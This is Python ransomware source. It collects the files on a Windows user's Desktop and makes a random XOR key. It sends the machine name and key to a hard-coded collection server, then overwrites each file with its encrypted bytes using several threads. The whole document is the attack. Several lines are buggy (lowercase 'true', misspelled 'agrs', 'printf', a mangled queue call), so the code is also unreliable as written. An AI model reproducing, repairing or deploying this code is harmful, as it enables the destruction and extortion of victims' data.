import socket
import os
import threading
import queue
import random

# Encryption
def encrypt(key):
    while true:
        file = q.get()
        print(f'Encrypting {file}')
        
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
                
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f'{file} Successfull')
        except:
            print('Error')
        q.task_done()
        
# changing server.py, change here also :O
IP_ADDRESS = '192.168.1.0'
PORT = 5678

ENCRYPTION_LEVEL = 512

key_char_pool = 'dhjgbjsdfbkjgbjdfbghrekt48564bh5b346'
key_char_pool_len = len(key_char_pool)

print("Hum...")
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []

for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print('Success files found')

hostname = os.getenv('COMPUTERNAME')

print("Encryption Key...")

key = ''

for i in range(ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_len-1)]
print("Success")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    print('Connected')
    s.send(f'{hostname} : {key}'.encode('utf-8'))
    print('All Done!')
    s.close
    
q.queue.Queue()
for f in abs_files:
    q.put(f)
    
for i in range(10):
    t = threading.Thread(target=encrypt, agrs=(key,), daemon = True)
    t.start()
    
q.join()
printf("Success!!")
input()
  
